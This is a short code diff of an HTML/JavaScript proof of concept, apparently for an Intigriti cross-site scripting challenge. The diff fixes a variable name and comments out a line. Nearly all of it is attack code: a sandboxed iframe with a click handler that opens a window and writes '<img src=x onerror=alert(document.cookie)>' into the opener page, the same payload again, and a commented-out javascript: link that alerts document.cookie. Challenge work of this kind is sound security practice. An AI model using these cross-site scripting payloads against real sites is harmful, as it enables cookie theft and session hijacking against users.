@@ -7,14 +7,14 @@
     iframe.src = 'https://challenge.intigriti.io/static/4/challenge1.png'
     iframe.sandbox = 'allow-popups allow-popups-to-escape-sandbox'
     iframe.onclick = function(e){
-      var  = window.open(this.contentWindow.name, this.src);
+      var mw = window.open(this.contentWindow.name, this.src);
       mw.opener.document.write("<img src=x onerror=alert(document.cookie)>");
     }
     document.body.appendChild(iframe);
   </script>
 
   <script>
-    window.opener.document.write("<img src=x onerror=alert(document.cookie)>");
+//     window.opener.document.write("<img src=x onerror=alert(document.cookie)>");
   </script>
 <!--   <a href="https://challenge.intigriti.io/" target="javascript:alert(document.cookie)">PoC1</a> -->
 
